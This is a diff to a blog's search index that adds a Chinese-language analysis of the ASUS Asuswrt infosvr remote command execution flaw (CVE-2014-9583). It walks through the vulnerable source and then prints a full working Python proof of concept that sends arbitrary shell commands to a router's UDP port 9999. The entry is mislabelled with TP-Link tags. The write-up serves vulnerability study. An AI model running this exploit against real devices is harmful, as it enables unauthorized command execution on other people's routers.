@@ -1417,4 +1417,101 @@ import {initHBE} from "/js/plugins/hbe.js";
         <tag>TP-Link</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ASUS华硕远程命令执行_CVE-2014-9583</title>
+    <url>/posts/ASUS%E5%8D%8E%E7%A1%95%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C_CVE-2014-9583.html</url>
+    <content><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250329204956381.png"
+                      alt="image-20250329204956381"
+                ><figcaption>image-20250329204956381</figcaption></figure></p>
+<p>在<code>Asuswrt</code>中存在<code>infosvr</code>进程，该进程监听在0.0.0.0 IP上，监听本机任何IP的9999 <code>UDP</code>端口。<code>Infosvr</code>自身的授权机制不完整，在<code>infosvr</code>处理用户提交的数据时也没有适合的过滤，而且使用了<code>system()</code>函数执行部分请求，最终导致远程命令执行漏洞。</p>
+<h1 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h1><p>目前没有找到有这个洞的版本固件，太老了</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>好在该项目是开源的，可以在github看源码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/RMerl/asuswrt-merlin/blob/master/release/src/router/infosvr/infosvr.c</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250329210454167.png"
+                      alt="image-20250329210454167"
+                ><figcaption>image-20250329210454167</figcaption></figure></p>
+<p>这里可以看到绑定到了<code>0.0.0.0</code>的<code>9999</code>端口上；</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250329211022831.png"
+                      alt="image-20250329211022831"
+                ><figcaption>image-20250329211022831</figcaption></figure></p>
+<p>接着将我们传入的请求传入<code>processReq</code>函数；</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250329211154508.png"
+                      alt="image-20250329211154508"
+                ><figcaption>image-20250329211154508</figcaption></figure></p>
+<p>该函数接受了512字节的数据，然后传进<code>processPacket</code>函数</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250330134919146.png"
+                      alt="image-20250330134919146"
+                ><figcaption>image-20250330134919146</figcaption></figure></p>
+<p>这里把请求数据转换成了<code>IBOX_COMM_PKT_HDR</code>结构</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250330135023426.png"
+                      alt="image-20250330135023426"
+                ><figcaption>image-20250330135023426</figcaption></figure></p>
+<p>所以想要触发漏洞，就需要按照这个特定的格式；</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250330135406910.png"
+                      alt="image-20250330135406910"
+                ><figcaption>image-20250330135406910</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250330135524646.png"
+                      alt="image-20250330135524646"
+                ><figcaption>image-20250330135524646</figcaption></figure></p>
+<p>首先前两个字节要设定为<code>\x0c\x15</code>，接着再往下看验证了<code>MacAddress</code>，这里已经是新版本修改过的代码了；</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250330135746409.png"
+                      alt="image-20250330135746409"
+                ><figcaption>image-20250330135746409</figcaption></figure></p>
+<p>漏洞版本：</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250330135838437.png"
+                      alt="image-20250330135838437"
+                ><figcaption>image-20250330135838437</figcaption></figure></p>
+<p>这里错用了memcpy，所以导致这个验证根本没什么用，</p>
+<p>之后就是一个<code>switch</code>，根据opcode对应相应的功能，当然也要符合结构；</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250330140150533.png"
+                      alt="image-20250330140150533"
+                ><figcaption>image-20250330140150533</figcaption></figure></p>
+<h1 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h1><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os, socket, struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Usage: &#x27;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&#x27; &lt;ip&gt; &lt;command&gt;&#x27;</span>, file=sys.stderr)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">enccmd = cmd.encode() <span class="comment">#命令转换为字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(enccmd) &gt; <span class="number">237</span>: <span class="comment">#不能超过237，会造成溢出</span></span><br><span class="line">    <span class="comment"># Strings longer than 237 bytes cause the buffer to overflow and possibly crash the server. </span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Values over 237 will give rise to undefined behaviour.&#x27;</span>, file=sys.stderr)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) <span class="comment">#创建UDP套接字，向ip:9999发送数据</span></span><br><span class="line">sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, PORT)) <span class="comment"># 绑定到本地9999端口</span></span><br><span class="line">sock.settimeout(<span class="number">2</span>) <span class="comment">#设置两秒超时，防止卡住</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Request consists of following things</span></span><br><span class="line"><span class="comment"># ServiceID     [byte]      ; NET_SERVICE_ID_IBOX_INFO</span></span><br><span class="line"><span class="comment"># PacketType    [byte]      ; NET_PACKET_TYPE_CMD</span></span><br><span class="line"><span class="comment"># OpCode        [word]      ; NET_CMD_ID_MANU_CMD</span></span><br><span class="line"><span class="comment"># Info          [dword]     ; Comment: &quot;Or Transaction ID&quot;</span></span><br><span class="line"><span class="comment"># MacAddress    [byte[6]]   ; Double-wrongly &quot;checked&quot; with memcpy instead of memcmp</span></span><br><span class="line"><span class="comment"># Password      [byte[32]]  ; Not checked at all</span></span><br><span class="line"><span class="comment"># Length        [word]</span></span><br><span class="line"><span class="comment"># Command       [byte[420]] ; 420 bytes in struct, 256 - 19 unusable in code = 237 usable</span></span><br><span class="line"></span><br><span class="line">packet = (<span class="string">b&#x27;\x0C\x15\x33\x00&#x27;</span> + os.urandom(<span class="number">4</span>) + (<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">38</span>) + struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="built_in">len</span>(enccmd)) + enccmd).ljust(<span class="number">512</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># 根据结构格式写数据包，与上面表格对应即可</span></span><br><span class="line">sock.sendto(packet, (ip, PORT))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Response consists of following things</span></span><br><span class="line"><span class="comment"># ServiceID     [byte]      ; NET_SERVICE_ID_IBOX_INFO</span></span><br><span class="line"><span class="comment"># PacketType    [byte]      ; NET_PACKET_TYPE_RES</span></span><br><span class="line"><span class="comment"># OpCode        [word]      ; NET_CMD_ID_MANU_CMD</span></span><br><span class="line"><span class="comment"># Info          [dword]     ; Equal to Info of request</span></span><br><span class="line"><span class="comment"># MacAddress    [byte[6]]   ; Filled in for us</span></span><br><span class="line"><span class="comment"># Length        [word]</span></span><br><span class="line"><span class="comment"># Result        [byte[420]] ; Actually returns that amount</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data, addr = sock.recvfrom(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">512</span> <span class="keyword">and</span> data[<span class="number">1</span>] == <span class="number">22</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">length = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, data[<span class="number">14</span>:<span class="number">16</span>])[<span class="number">0</span>]</span><br><span class="line">s = <span class="built_in">slice</span>(<span class="number">16</span>, <span class="number">16</span>+length)</span><br><span class="line">sys.stdout.buffer.write(data[s])</span><br><span class="line"></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>IOT</category>
+        <category>CVE</category>
+        <category>TP-Link</category>
+      </categories>
+      <tags>
+        <tag>IOT</tag>
+        <tag>CVE</tag>
+        <tag>TP-Link</tag>
+      </tags>
+  </entry>
 </search>
